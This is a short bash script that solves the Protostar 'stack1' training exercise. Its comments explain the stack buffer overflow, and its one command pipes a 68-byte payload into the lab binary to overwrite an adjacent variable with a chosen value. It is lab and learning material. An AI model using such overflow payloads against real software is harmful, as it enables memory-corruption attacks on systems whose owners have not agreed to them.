#!/bin/bash
# Write more than 64 + sizeof(int) = 68 bytes onto the stdin of the program
# The first 64 bytes fill the buffer, the last 4 bytes are written into modified
# The bytes to write are 0x61626364 (Litte-Endian) -> 0x64 0x63 0x62 0x61 -> dbca
echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadbca" | /opt/protostar/bin/stack1
